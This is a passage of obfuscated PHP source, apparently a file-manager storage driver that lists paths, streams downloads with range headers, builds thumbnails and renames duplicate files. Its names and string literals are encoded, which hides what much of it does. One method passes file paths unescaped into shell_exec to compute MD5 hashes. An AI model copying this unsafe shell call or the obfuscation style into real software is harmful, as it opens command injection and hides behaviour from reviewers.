= $Å¶øÉñ—[$·ß’á½­[94]]; $»ÇÊê¿à = $this->pathDriver; if (substr($Å¶øÉñ—[$·ß’á½­[94]], 0, strlen($»ÇÊê¿à)) == $»ÇÊê¿à) { $´½íí¡ = substr($´½íí¡, strlen($»ÇÊê¿à)); } $this->listAllMake($´½íí¡, $’¬¬”„ı); } } public function listAllSimple($öÊé½‰ú, $Êö¯Šó³ = false) { $¾ôÎÌ§ã = $this->listAll($öÊé½‰ú); return $this->listAllSimpleMake($¾ôÎÌ§ã, $this->getPathOuter($öÊé½‰ú), $Êö¯Šó³); } public function listAllSimpleMake($æ¯ÏÂò, $ª¼Øƒ¹¤, $Ü¦âÚ¶) { $°Š¶²¡« =& $_SERVER[ú÷îèÆÜ]; $Ì‘É‹¿Æ = array(); $ª¼Øƒ¹¤ = rtrim(get_path_father($ª¼Øƒ¹¤), $°Š¶²¡«[18]) . $°Š¶²¡«[18]; foreach ($æ¯ÏÂò as $êäßç½) { $Ñô³Ê = array($°Š¶²¡«[94] => $êäßç½[$°Š¶²¡«[94]], $°Š¶²¡«[96] => $êäßç½[$°Š¶²¡«[94]], $°Š¶²¡«[85] => $êäßç½[$°Š¶²¡«[85]]); if (isset($êäßç½[$°Š¶²¡«[86]]) && !$êäßç½[$°Š¶²¡«[85]]) { $Ñô³Ê[$°Š¶²¡«[86]] = $êäßç½[$°Š¶²¡«[86]]; } if (isset($êäßç½[$°Š¶²¡«[95]])) { $Ñô³Ê[$°Š¶²¡«[95]] = $êäßç½[$°Š¶²¡«[95]]; } if (is_array($êäßç½[$°Š¶²¡«[97]])) { $Ñô³Ê[$°Š¶²¡«[96]] = $êäßç½[$°Š¶²¡«[97]][$°Š¶²¡«[94]]; $Ñô³Ê[$°Š¶²¡«[86]] = $êäßç½[$°Š¶²¡«[97]][$°Š¶²¡«[86]]; $Ñô³Ê[$°Š¶²¡«[95]] = $êäßç½[$°Š¶²¡«[97]][$°Š¶²¡«[95]]; } else { if (substr($êäßç½[$°Š¶²¡«[94]], 0, strlen($ª¼Øƒ¹¤)) == $ª¼Øƒ¹¤) { $Ñô³Ê[$°Š¶²¡«[94]] = substr($êäßç½[$°Š¶²¡«[94]], strlen($ª¼Øƒ¹¤)); } } $»ÓÆÔŞğ = $êäßç½[$°Š¶²¡«[85]] ? $°Š¶²¡«[18] : $°Š¶²¡«[22]; $Ñô³Ê[$°Š¶²¡«[96]] = rtrim($Ñô³Ê[$°Š¶²¡«[96]], $°Š¶²¡«[18]) . $»ÓÆÔŞğ; $Ñô³Ê[$°Š¶²¡«[94]] = $°Š¶²¡«[18] . trim($Ñô³Ê[$°Š¶²¡«[94]], $°Š¶²¡«[18]) . $»ÓÆÔŞğ; if (!$Ü¦âÚ¶) { $‹¬ï¿á = explode($°Š¶²¡«[18], trim($Ñô³Ê[$°Š¶²¡«[94]], $°Š¶²¡«[18])); $Ñô³Ê[$°Š¶²¡«[94]] = $°Š¶²¡«[18] . implode($°Š¶²¡«[18], array_slice($‹¬ï¿á, 1)) . $»ÓÆÔŞğ; } $Ì‘É‹¿Æ[] = $Ñô³Ê; } return array_sort_by($Ì‘É‹¿Æ, $°Š¶²¡«[94]); } public function upload($ƒúËÔøİ, $·š¬ˆ¡, $ÉåÁÇ¢ = false, $îÆÑÑÉñ = REPEAT_REPLACE) { } public function uploadFileByID($×ãŒ‡é, $˜Ì ÉÔ¿, $€µ®¬İ) { } public function uploadFileByPath($³·ÎÖş, $ÄİÇõ“­, $¬õ¼¶Ú = array()) { } public function isUploadServer() { $ »Ü€ã =& $_SERVER[ú÷îèÆÜ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ »Ü€ã[98]) { return !0; } return $GLOBALS[$ »Ü€ã[16]][$ »Ü€ã[99]][$ »Ü€ã[100]]; } public function isFileOutServer() { $¹œ×†‡› =& $_SERVER[ú÷îèÆÜ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¹œ×†‡›[98]) { return !0; } return $GLOBALS[$¹œ×†‡›[16]][$¹œ×†‡›[99]][$¹œ×†‡›[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($í¹ÛÙÃí) { $º‚ëáÎà =& $_SERVER[ú÷îèÆÜ]; if (!$this->isCdnHost()) { return $í¹ÛÙÃí; } return str_replace(trim(get_url_root($í¹ÛÙÃí), $º‚ëáÎà[18]), trim($this->cdnHost, $º‚ëáÎà[18]), $í¹ÛÙÃí); } public function uploadLink($ÙçÚ›ä™, $”‰µğßó = 0) { $§‚ğô£­ =& $_SERVER[ú÷îèÆÜ]; if ($this->isUploadServer()) { return; } $ËçÏÅ‹Ï = $this->getType(); if (!in_array($ËçÏÅ‹Ï, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $œ¹½¦Ú‹ = 1024 * 1024 * 10; $•ËÖæÎº = $”‰µğßó <= $œ¹½¦Ú‹ ? $§‚ğô£­[102] : $§‚ğô£­[103]; $«·¦‰Î = (!$”‰µğßó ? 1 : ceil($”‰µğßó / pow(1024, 3))) * 3600 * 4; $åÚöñ‰ = $this->{$•ËÖæÎº}($ÙçÚ›ä™, $«·¦‰Î); if ($åÚöñ‰) { $åÚöñ‰[$§‚ğô£­[104]] = $ÙçÚ›ä™; $åÚöñ‰[$§‚ğô£­[105]] = $ËçÏÅ‹Ï; } return $åÚöñ‰; } public function uploadFormData($±üÀêÕ, $ ¸¹Œø“ = 3600) { } public function multiUploadFormData($¶ëî’ó, $é©ĞÊ¶ã = 3600) { } public function download($­ãŒšÇ, $½óôÆ•¼) { } public function ext($‚§ş·Ù„) { $¿ÓÏûªò =& $_SERVER[ú÷îèÆÜ]; if (strpos($‚§ş·Ù„, $¿ÓÏûªò[18]) === -1) { $É¯„€ = $‚§ş·Ù„; } else { $É¯„€ = $this->pathThis($‚§ş·Ù„); } $¢™¬³”ú = $¿ÓÏûªò[22]; if (strstr($É¯„€, $¿ÓÏûªò[20])) { $¢™¬³”ú = substr($É¯„€, strrpos($É¯„€, $¿ÓÏûªò[20]) + 1); $¢™¬³”ú = strtolower($¢™¬³”ú); } if (strlen($¢™¬³”ú) > 3 && preg_match($¿ÓÏûªò[106], $¢™¬³”ú, $œÛÜ²ä»)) { $¢™¬³”ú = $¿ÓÏûªò[22]; } return $¢™¬³”ú; } public function pathThis($§šÛÃÎÇ) { $îÊüäéè =& $_SERVER[ú÷îèÆÜ]; $§šÛÃÎÇ = str_replace($îÊüäéè[107], $îÊüäéè[18], rtrim($§šÛÃÎÇ, $îÊüäéè[18])); $¾›ã“ñ = strrpos($§šÛÃÎÇ, $îÊüäéè[18]); if ($¾›ã“ñ === !1) { return $§šÛÃÎÇ; } return substr($§šÛÃÎÇ, $¾›ã“ñ + 1); } public function pathFather($û·’°îÕ) { $Ñ²Ç÷ïç =& $_SERVER[ú÷îèÆÜ]; $û·’°îÕ = str_replace($Ñ²Ç÷ïç[107], $Ñ²Ç÷ïç[18], rtrim($û·’°îÕ, $Ñ²Ç÷ïç[18])); $ƒº™…‚ = strrpos($û·’°îÕ, $Ñ²Ç÷ïç[18]); if ($ƒº™…‚ === !1) { return $Ñ²Ç÷ïç[22]; } return substr($û·’°îÕ, 0, $ƒº™…‚ + 1); } public function hashSimple($†ÀÀ¬û•) { $ùæ Ş† =& $_SERVER[ú÷îèÆÜ]; if (!$†ÀÀ¬û•) { return md5($ùæ Ş†[22]); } $ÑãØËŞ = $this->size($†ÀÀ¬û•); $­©ŞÖËä = 200; $…«ÄØÇä = 50; if ($ÑãØËŞ <= $­©ŞÖËä * $…«ÄØÇä) { return $this->hashMd5($†ÀÀ¬û•) . $ÑãØËŞ; } $Ì„º½ê› = intval($ÑãØËŞ / $…«ÄØÇä); $‰Ø·Òù = $ùæ Ş†[22]; for ($üöºÄ´ = 0; $üöºÄ´ < $…«ÄØÇä; $üöºÄ´++) { $‰Ø·Òù .= $this->fileSubstr($†ÀÀ¬û•, $Ì„º½ê› * $üöºÄ´, $­©ŞÖËä); } $‰Ø·Òù .= $this->fileSubstr($†ÀÀ¬û•, $ÑãØËŞ - $­©ŞÖËä, $­©ŞÖËä); return md5($‰Ø·Òù) . $ÑãØËŞ; } public static $md5Cache = array(); public function hashMd5($ ¿şœôø) { if (!$ ¿şœôø) { return md5($_SERVER[ú÷îèÆÜ][22]); } $ ¿şœôø = $this->iconvSystem($ ¿şœôø); if (isset(self::$md5Cache[$ ¿şœôø])) { return self::$md5Cache[$ ¿şœôø]; } self::$md5Cache[$ ¿şœôø] = $this->hashMd5Shell($ ¿şœôø); if (!self::$md5Cache[$ ¿şœôø]) { self::$md5Cache[$ ¿şœôø] = @md5_file($ ¿şœôø); } return self::$md5Cache[$ ¿şœôø]; } private function hashMd5Shell($…ÖË¤÷) { $á§ÍÓŞ« =& $_SERVER[ú÷îèÆÜ]; if (!$…ÖË¤÷) { return md5($á§ÍÓŞ«[22]); } if (!function_exists($á§ÍÓŞ«[108])) { return !1; } $ÑÀÍÔÍç = array($á§ÍÓŞ«[109], $á§ÍÓŞ«[110]); $‰°®­Öå = Cache::get($á§ÍÓŞ«[111]); if (!$‰°®­Öå) { $¥•´•„ = BASIC_PATH . $á§ÍÓŞ«[112]; $–¢‡ÕËÌ = md5_file($¥•´•„); $‰°®­Öå = $á§ÍÓŞ«[113]; foreach ($ÑÀÍÔÍç as $ß¾ÕÍŠÃ) { $ƒ¢…¢ûü = shell_exec($ß¾ÕÍŠÃ . "\40\42{$¥•´•„}\42"); if ($ƒ¢…¢ûü && substr(trim($ƒ¢…¢ûü), 0, 32) == $–¢‡ÕËÌ) { $‰°®­Öå = $ß¾ÕÍŠÃ; break; } } Cache::set($á§ÍÓŞ«[111], $‰°®­Öå, 3600); } if ($‰°®­Öå == $á§ÍÓŞ«[113]) { return !1; } $ƒ¢…¢ûü = shell_exec($‰°®­Öå . "\x20\42{$…ÖË¤÷}\42"); $ƒ¢…¢ûü = str_replace($á§ÍÓŞ«[114], $á§ÍÓŞ«[22], $ƒ¢…¢ûü); return substr($ƒ¢…¢ûü, 0, 32); } public function link($¾ş™ØÁ ) { return $¾ş™ØÁ ; } public function fileOut($Ší÷Ÿ’±, $íÄíªÈ = false, $‹¸Ãµ€° = false, $·€²ü£ = '') { $»Üúàôª =& $_SERVER[ú÷îèÆÜ]; $this->cacheMethod(null, null); if (!$Ší÷Ÿ’± || !$this->exist($Ší÷Ÿ’±)) { show_json(LNG($»Üúàôª[115]), !1, $‹¸Ãµ€°); } $Ì¦ºşûÕ = $this->getType() == $»Üúàôª[116]; $çºÁûÂğ = $GLOBALS[$»Üúàôª[16]][$»Üúàôª[99]][$»Üúàôª[117]][$»Üúàôª[118]]; $˜Ç²›ˆ† = (double) $GLOBALS[$»Üúàôª[16]][$»Üúàôª[99]][$»Üúàôª[117]][$»Üúàôª[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $£½Ğ³ß = $this->infoFull($Ší÷Ÿ’±); $¯ç˜““ü = $£½Ğ³ß[$»Üúàôª[86]]; $ûó”¾ßÎ = gmdate($»Üúàôª[120], $£½Ğ³ß[$»Üúàôª[95]]); $ñ§õùÆå = $‹¸Ãµ€° ? $‹¸Ãµ€° : $this->iconvApp($£½Ğ³ß[$»Üúàôª[42]]); $×ë¾‘ª = 0; $ÜîåŒıÇ = $¯ç˜““ü - 1; $ö¸ö±ùÏ = $this->ext($ñ§õùÆå); if (in_array($ö¸ö±ùÏ, array($»Üúàôª[121], $»Üúàôª[122], $»Üúàôª[123], $»Üúàôª[124]))) { $ö¸ö±ùÏ = $»Üúàôª[125]; } if (in_array($ö¸ö±ùÏ, array($»Üúàôª[126]))) { $ö¸ö±ùÏ = $»Üúàôª[127]; } if (!$·€²ü£) { $·€²ü£ = md5($ûó”¾ßÎ . $¯ç˜““ü); } $·€²ü£ = $»Üúàôª[128] . $·€²ü£ . $»Üúàôª[128]; $¾ŞµÉËê = get_file_mime($ö¸ö±ùÏ); $‰‡é»è‚ = !0; $‰‡é»è‚ = isset($_GET[$»Üúàôª[129]]) ? !1 : !0; if ($íÄíªÈ === !1 && !mime_support($¾ŞµÉËê)) { $¾ŞµÉËê = $»Üúàôª[130]; } header($»Üúàôª[131]); header($»Üúàôª[132] . $¾ŞµÉËê); $…º”…à¯ = rawurlencode($ñ§õùÆå); $…º”…à¯ = $»Üúàôª[128] . $…º”…à¯ . $»Üúàôª[133] . $…º”…à¯; if ($íÄíªÈ) { header($»Üúàôª[134]); header($»Üúàôª[135] . $…º”…à¯); } else { if ($‰‡é»è‚) { header($»Üúàôª[136] . $…º”…à¯); } } header($»Üúàôª[137] . gmdate($»Üúàôª[120], time() + 3600 * 24 * 30) . $»Üúàôª[138]); header($»Üúàôª[139]); header($»Üúàôª[140]); header($»Üúàôª[141]); if (isset($_SERVER[$»Üúàôª[142]]) && strtotime($_SERVER[$»Üúàôª[142]]) == $£½Ğ³ß[$»Üúàôª[95]]) { header($»Üúàôª[143], !0, 304); die; } if (isset($_SERVER[$»Üúàôª[144]]) && $_SERVER[$»Üúàôª[144]] == $·€²ü£) { header($»Üúàôª[145] . $·€²ü£, !0, 304); die; } header($»Üúàôª[145] . $·€²ü£); header($»Üúàôª[146] . $ûó”¾ßÎ . $»Üúàôª[138]); header($»Üúàôª[147] . $ñ§õùÆå); header($»Üúàôª[148]); header($»Üúàôª[149] . $¯ç˜““ü); header($»Üúàôª[150]); Hook::trigger($»Üúàôª[151], $Ší÷Ÿ’±, $¯ç˜““ü, $ñ§õùÆå, $ö¸ö±ùÏ); if (!$íÄíªÈ && $ö¸ö±ùÏ == $»Üúàôª[152]) { if ($¯ç˜““ü > 1024 * 1024 * 5) { die; } $ïôŒÒ¢¡ = $this->getContent($Ší÷Ÿ’±); $ïôŒÒ¢¡ = Html::clearSVG($ïôŒÒ¢¡); header($»Üúàôª[153] . strlen($ïôŒÒ¢¡)); echo $ïôŒÒ¢¡; die; } $Şõ·´€Ñ = strtolower($_SERVER[$»Üúàôª[154]]); if ($Ì¦ºşûÕ && $Şõ·´€Ñ && $çºÁûÂğ) { if (strstr($Şõ·´€Ñ, $»Üúàôª[155])) { header($»Üúàôª[156] . $Ší÷Ÿ’±); } else { if (strstr($Şõ·´€Ñ, $»Üúàôª[157])) { header($»Üúàôª[158] . $Ší÷Ÿ’±); } else { if (strstr($Şõ·´€Ñ, $»Üúàôª[159])) { header($»Üúàôª[160] . $Ší÷Ÿ’±); } } } if ($˜Ç²›ˆ†) { header($»Üúàôª[161] . $˜Ç²›ˆ†); } return; } if (isset($_SERVER[$»Üúàôª[162]])) { if (preg_match($»Üúàôª[163], $_SERVER[$»Üúàôª[162]], $ôÏñ¦Å)) { $×ë¾‘ª = intval($ôÏñ¦Å[1]); $×ë¾‘ª = $×ë¾‘ª <= 0 ? 0 : ($×ë¾‘ª >= $ÜîåŒıÇ ? $ÜîåŒıÇ : $×ë¾‘ª); if (!empty($ôÏñ¦Å[2])) { $±€®¾Éå = intval($ôÏñ¦Å[2]); $ÜîåŒıÇ = $±€®¾Éå < $×ë¾‘ª ? $×ë¾‘ª : ($±€®¾Éå >= $ÜîåŒıÇ ? $ÜîåŒıÇ : $±€®¾Éå); } } header($»Üúàôª[164]); header("\103\157\156\164\x65\x6e\x74\x2d\x52\x61\156\147\x65\72\x20\142\x79\164\145\163\40{$×ë¾‘ª}\x2d{$ÜîåŒıÇ}\57" . $¯ç˜““ü); } else { header($»Üúàôª[165]); } header($»Üúàôª[166]); $ÁÄ¸÷ó‘ = !0; if ($_SERVER[$»Üúàôª[167]] == $»Üúàôª[168] && $¯ç˜““ü > 1204 * 1024 * 1024 * 2) { $ÁÄ¸÷ó‘ = !1; } if ($ÁÄ¸÷ó‘) { header($»Üúàôª[169] . ($ÜîåŒıÇ - $×ë¾‘ª + 1)); } if ($_SERVER[$»Üúàôª[170]] == $»Üúàôª[171]) { return; } $šŒøÉ»® = 1024 * 100; $‹´¶ùä = 0; if ($˜Ç²›ˆ†) { $‹´¶ùä = intval(1000 * 1000 * ($šŒøÉ»® / $˜Ç²›ˆ†)); } while ($×ë¾‘ª <= $ÜîåŒıÇ) { $¹Òú‚ÂÑ = timeFloat(); check_abort(); $¤œğ¬¢‡ = $ÜîåŒıÇ - $×ë¾‘ª + 1; if ($¤œğ¬¢‡ <= $šŒøÉ»®) { $šŒøÉ»® = $¤œğ¬¢‡; } echo $this->fileSubstr($Ší÷Ÿ’±, $×ë¾‘ª, $šŒøÉ»®); $×ë¾‘ª += $šŒøÉ»®; if ($šŒøÉ»® == $¤œğ¬¢‡) { $×ë¾‘ª = $ÜîåŒıÇ + 1; } if ($‹´¶ùä) { $İàâ­Ê’ = intval(1000 * 1000 * (timeFloat() - $¹Òú‚ÂÑ)); $ª½­ƒƒé = $‹´¶ùä - $İàâ­Ê’; if ($ª½­ƒƒé > 5) { usleep($ª½­ƒƒé); } } } } public function fileOutServer($©»ÆÅ„Ò, $ß‚ÌĞ¦ë = false, $¿””Üäú = false, $ÊšàĞ· = '') { $this->fileOut($©»ÆÅ„Ò, $ß‚ÌĞ¦ë, $¿””Üäú, $ÊšàĞ·); } public function fileOutLink($Õ¦Œ¡ãœ) { header($_SERVER[ú÷îèÆÜ][172] . $Õ¦Œ¡ãœ); die; } public function cacheMethod($øÚåÁú, $À…É´€¶, $Ïæáäè÷ = null) { $·ÆëÕŸ =& $_SERVER[ú÷îèÆÜ]; static $­Í¨„ È = array(); $´‘¯úø = $À…É´€¶ ? ltrim($this->getPathOuter($À…É´€¶), $·ÆëÕŸ[18]) : $·ÆëÕŸ[22]; $“®âËš = $·ÆëÕŸ[173] . $øÚåÁú . $·ÆëÕŸ[174] . rtrim($´‘¯úø, $·ÆëÕŸ[18]); if (is_null($øÚåÁú)) { $­Í¨„ È = array(); return; } if (is_null($À…É´€¶)) { foreach ($­Í¨„ È as $“®âËš => $¶Ÿ¿ÏğŸ) { if (!strstr($“®âËš, $·ÆëÕŸ[173] . $øÚåÁú . $·ÆëÕŸ[175])) { continue; } unset($­Í¨„ È[$“®âËš]); } return; } if (!is_null($Ïæáäè÷)) { $­Í¨„ È[$“®âËš] = $Ïæáäè÷; return; } $±Ü§¯¨ = isset($­Í¨„ È[$“®âËš]) ? $­Í¨„ È[$“®âËš] : null; if (!is_null($±Ü§¯¨)) { return $±Ü§¯¨; } $±Ü§¯¨ = $this->{$øÚåÁú}($À…É´€¶); $­Í¨„ È[$“®âËš] = $±Ü§¯¨; return $±Ü§¯¨; } public function cacheMethodInfoSet($¯¶Â’â, $„ñÏ®Ğ¦, $Æ¨ÛöÊ = false) { $Ïê¨”²Ñ =& $_SERVER[ú÷îèÆÜ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ïê¨”²Ñ[176], $¯¶Â’â, $„ñÏ®Ğ¦); $this->cacheMethod($Ïê¨”²Ñ[177], $¯¶Â’â, $„ñÏ®Ğ¦ ? !1 : !0); if (is_array($Æ¨ÛöÊ)) { $this->cacheMethod($Ïê¨”²Ñ[178], $¯¶Â’â, $Æ¨ÛöÊ); } } public function fileOutImage($ÈÊùŸ­Ş, $© ë›ûÔ = 250) { $ˆÂ‘îå =& $_SERVER[ú÷îèÆÜ]; set_timeout(); if (substr($ÈÊùŸ­Ş, 0, 4) == $ˆÂ‘îå[159]) { $this->fileOutLink($ÈÊùŸ­Ş); } $„¨ş˜î– = $this->info($ÈÊùŸ­Ş); $‰‡ã‰ = !1; $©ã²¾ó = isset($GLOBALS[$ˆÂ‘îå[179]]) ? $GLOBALS[$ˆÂ‘îå[179]] : array(); if ($©ã²¾ó && $©ã²¾ó[$ˆÂ‘îå[180]] == $„¨ş˜î–[$ˆÂ‘îå[94]]) { $„¨ş˜î– = $©ã²¾ó; $½»æÙÇş = $„¨ş˜î–[$ˆÂ‘îå[181]]; if ($½»æÙÇş && isset($½»æÙÇş[$ˆÂ‘îå[182]])) { if ($½»æÙÇş[$ˆÂ‘îå[182]] <= $© ë›ûÔ && $½»æÙÇş[$ˆÂ‘îå[183]] <= $© ë›ûÔ) { $‰‡ã‰ = !0; } } } if ($„¨ş˜î–[$ˆÂ‘îå[86]] <= 1024 * 50 || $‰‡ã‰ || !function_exists($ˆÂ‘îå[184]) || $„¨ş˜î–[$ˆÂ‘îå[185]] == $ˆÂ‘îå[186]) { return $this->fileOut($ÈÊùŸ­Ş, !1, $„¨ş˜î–[$ˆÂ‘îå[42]]); } $ãäÜé‡¿ = kodIO::hashPath($„¨ş˜î–); $¡øÊ§Íİ = "\143\x6f\x76\145\x72\x5f{$ãäÜé‡¿}\137{$© ë›ûÔ}\x2e\x70\x6e\147"; $ÄõÑÁÖ´ = IO_PATH_SYSTEM_TEMP . $ˆÂ‘îå[187]; $Öë‘–à³ = IO::infoFullSimple($ÄõÑÁÖ´); $ùé¨ĞÉª = $Öë‘–à³ && is_array($Öë‘–à³) ? $Öë‘–à³[$ˆÂ‘îå[94]] : $ˆÂ‘îå[22]; if (!$ùé¨ĞÉª) { $ùé¨ĞÉª = IO::mkdir($ÄõÑÁÖ´); } if ($„¨ş˜î–[$ˆÂ‘îå[188]] == $ˆÂ‘îå[189] && isset($„¨ş˜î–[$ˆÂ‘îå[190]]) && $„¨ş˜î–[$ˆÂ‘îå[190]] == kodIO::sourceID($ùé¨ĞÉª)) { $·½‚ËÖˆ = $„¨ş˜î–[$ˆÂ‘îå[191]]; if ($© ë›ûÔ <= 500) { $¬‚è£¢¡ = preg_replace($ˆÂ‘îå[192], $ˆÂ‘îå[193], $„¨ş˜î–[$ˆÂ‘îå[42]]); $·½‚ËÖˆ = IO::fileNameExist($ùé¨ĞÉª, $¬‚è£¢¡); } return IO::fileOut(KodIO::make($·½‚ËÖˆ), !1, $„¨ş˜î–[$ˆÂ‘îå[42]]); } $®™½°¨ = IO::fileNameExist($ùé¨ĞÉª, $¡øÊ§Íİ); if ($®™½°¨) { return IO::fileOut(KodIO::make($®™½°¨), !1, $„¨ş˜î–[$ˆÂ‘îå[42]]); } if ($© ë›ûÔ > 1000) { $this->makeImageCover($ùé¨ĞÉª, $ÈÊùŸ­Ş, $¡øÊ§Íİ, $© ë›ûÔ); $this->makeImageCover($ùé¨ĞÉª, $ÈÊùŸ­Ş, "\143\157\166\x65\162\137{$ãäÜé‡¿}\x5f\62\65\x30\x2e\160\156\x67", 250); $®™½°¨ = IO::fileNameExist($ùé¨ĞÉª, $¡øÊ§Íİ); if ($®™½°¨) { return IO::fileOut(KodIO::make($®™½°¨), !1, $„¨ş˜î–[$ˆÂ‘îå[42]]); } die; } $î¥Ææù = Cache::get($¡øÊ§Íİ); if ($î¥Ææù == $ˆÂ‘îå[194] || $î¥Ææù == $ˆÂ‘îå[195]) { echo $î¥Ææù; die; } Cache::set($¡øÊ§Íİ, $ˆÂ‘îå[195], 60); $„‡–âÖÖ = array($ùé¨ĞÉª, $„¨ş˜î–[$ˆÂ‘îå[94]], $¡øÊ§Íİ, $© ë›ûÔ); $åÍçü´ı = $ˆÂ‘îå[196] . $„¨ş˜î–[$ˆÂ‘îå[86]] . $ˆÂ‘îå[197] . $¡øÊ§Íİ . $ˆÂ‘îå[198] . $„¨ş˜î–[$ˆÂ‘îå[42]] . $ˆÂ‘îå[199] . $„¨ş˜î–[$ˆÂ‘îå[94]]; TaskQueue::add($ˆÂ‘îå[200], $„‡–âÖÖ, $åÍçü´ı, $¡øÊ§Íİ); } public function makeImageCover($¹’ëÑğ¶, $¯Üã, $½Ã¢‰µ², $¾İ¶Ä×°) { $ùÚ ¡€‚ =& $_SERVER[ú÷îèÆÜ]; if (IO::fileNameExist($¹’ëÑğ¶, $½Ã¢‰µ²)) { return $ùÚ ¡€‚[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ƒ£×¼óŒ = DATA_THUMB . $½Ã¢‰µ²; del_file($ƒ£×¼óŒ); $€õã´ó = TEMP_FILES . $½Ã¢‰µ²; if (!@file_exists($€õã´ó)) { $€õã´ó = IO::download($¯Üã, $€õã´ó); } if (!@file_exists($€õã´ó)) { return $ùÚ ¡€‚[202]; } ImageThumb::createThumb($€õã´ó, $ƒ£×¼óŒ, $¾İ¶Ä×°, $¾İ¶Ä×° * 10); if (@file_exists($ƒ£×¼óŒ)) { Cache::remove($½Ã¢‰µ²); return IO::move($ƒ£×¼óŒ, $¹’ëÑğ¶); } Cache::set($½Ã¢‰µ², $ùÚ ¡€‚[194], 600); del_file($ƒ£×¼óŒ); return $ùÚ ¡€‚[203] . $€õã´ó . $ùÚ ¡€‚[81]; } public function fileOutImageServer($õŞîÅ¸ë, $„ÑäÁÓŠ = 250) { $this->fileOutImage($õŞîÅ¸ë, $„ÑäÁÓŠ); } public function fileNameAuto($†‘Áï, $İÍá¬Ìˆ, $şâ—ùİ¥ = REPEAT_RENAME, $«­ºÀõ´ = false) { $·Í»‰” =& $_SERVER[ú÷îèÆÜ]; $Ğ ’œÏ = $†‘Áï === $·Í»‰”[22] ? $İÍá¬Ìˆ : rtrim($†‘Áï, $·Í»‰”[18]) . $·Í»‰”[18] . $İÍá¬Ìˆ; if ($şâ—ùİ¥ == REPEAT_REPLACE || !$this->exist($Ğ ’œÏ) || $«­ºÀõ´ && $şâ—ùİ¥ != REPEAT_RENAME_FOLDER) { return $İÍá¬Ìˆ; } if ($şâ—ùİ¥ == REPEAT_SKIP) { return !1; } $ç‘¯¥ û = $·Í»‰”[20] . get_path_ext($İÍá¬Ìˆ); $ç‘¯¥ û = $ç‘¯¥ û == $·Í»‰”[20] || $«­ºÀõ´ ? $·Í»‰”[22] : $ç‘¯¥ û; $Ûé ›Ïî = 1; $½šºˆõø = substr($İÍá¬Ìˆ, 0, strlen($İÍá¬Ìˆ) - strlen($ç‘¯¥ û)); $òà€Ö¶ = $½šºˆõø . "\x28{$Ûé ›Ïî}\51{$ç‘¯¥ û}"; while ($this->exist(rtrim($†‘Áï, $·Í»‰”[18]) . $·Í»‰”[18] . $òà€Ö¶)) { $òà€Ö¶ = $½šºˆõø . "\x28{$Ûé ›Ïî}\x29{$ç‘¯¥ û}"; $Ûé ›Ïî++; } return $òà€Ö¶; } private function fileNameAutoList($Ñ‚µØˆ¶, $ôÖŸá¡æ, $™œœºÃ = false) { $ç˜è›ãœ =& $_SERVER[ú÷îèÆÜ]; $ÂêÚÆÈ¢ = $this->listPath($Ñ‚µØˆ¶, !0); $ÂêÚÆÈ¢ = array_merge($ÂêÚÆÈ¢[$ç˜è›ãœ[92]], $ÂêÚÆÈ¢[$ç˜è›ãœ[93]]); $Áµ•¼ò = array_to_keyvalue($ÂêÚÆÈ¢, $ç˜è›ãœ[22], $ç˜è›ãœ[42]); $ÃÒİª¼§ = $ç˜è›ãœ[20] . get_path_ext($ôÖŸá¡æ); $ÃÒİª¼§ = $ÃÒİª¼§ == $ç˜è›ãœ[20] || $™œœºÃ ? $ç˜è›ãœ[22] : $ÃÒİª¼§; $ÙªÏ©ö = substr($ôÖŸá¡æ, 0, strlen($ôÖŸá¡æ) - strlen($ÃÒİª¼§)); $ãÆê®¾Œ = $ÙªÏ©ö . "\x28\60\x29{$ÃÒİª¼§}"; for ($ÖË­½Ÿ¯ = 1; $ÖË­½Ÿ¯ <= count($Áµ•¼ò) + 1; $ÖË­½Ÿ¯++) { $ãÆê®¾Œ = $ÙªÏ©ö . "\50{$ÖË­½Ÿ¯}\x29{$ÃÒİª¼§}"; if (!in_array_not_case($ãÆê®¾Œ, $Áµ•¼ò)) { return $ãÆê®¾Œ; } } return $ãÆê®¾Œ; } public function listAllFiles($†©ñí€Ì, $Ô íğŠŸ) { $ôü¶µæŸ =& $_SERVER[ú÷îèÆÜ]; if (empty($Ô íğŠŸ)) { return array(); } $ÔÖ‰™£ = array_keys($Ô íğŠŸ); $¤©ğ°‹ = array(); $†©ñí€Ì = trim($†©ñí€Ì, $ôü¶µæŸ[18]); foreach ($Ô íğŠŸ as $÷‚â¼ü² => $ƒÍÉ³÷) { $Ñ©¦òèö = ltrim(substr(trim($÷‚â¼ü², $ôü¶µæŸ[18]), strlen($†©ñí€Ì)), $ôü¶µæŸ[18]); if (substr($÷‚â¼ü², -1) == $ôü¶µæŸ[18]) { $Ñ©¦òèö = rtrim($Ñ©¦òèö, $ôü¶µæŸ[18]) . $ôü¶µæŸ[18]; } $¤©ğ°‹ = array_merge($¤©ğ°‹, $this->slicePath($Ñ©¦òèö)); } $ˆ¢ŞÎşÜ = array(); foreach (array_unique($¤©ğ°‹) as $Õ±úâöÅ) { $§û°ÑĞ³ = array($ôü¶µæŸ[94] => $this->getPathOuter($ôü¶µæŸ[18] . $†©ñí€Ì . $ôü¶µæŸ[18] . $Õ±úâöÅ), $ôü¶µæŸ[85] => 1, $ôü¶µæŸ[86] => 0); if (substr($Õ±úâöÅ, -1) != $ôü¶µæŸ[18]) { $§û°ÑĞ³[$ôü¶µæŸ[85]] = 0; $ÕÙÂÚ¯ô = $this->getPath($†©ñí€Ì . $ôü¶µæŸ[18] . $Õ±úâöÅ); if (isset($Ô íğŠŸ[$ÕÙÂÚ¯ô])) { $¦Ğ˜¤¶ã = $Ô íğŠŸ[$ÕÙÂÚ¯ô]; if (isset($¦Ğ˜¤¶ã[$ôü¶µæŸ[86]])) { $§û°ÑĞ³[$ôü¶µæŸ[86]] = intval($¦Ğ˜¤¶ã[$ôü¶µæŸ[86]]); } if (isset($¦Ğ˜¤¶ã[$ôü¶µæŸ[204]])) { $§û°ÑĞ³[$ôü¶µæŸ[95]] = intval($¦Ğ˜¤¶ã[$ôü¶µæŸ[204]]); } } } $ˆ¢ŞÎşÜ[] = $§û°ÑĞ³; } return $ˆ¢ŞÎşÜ; } public function 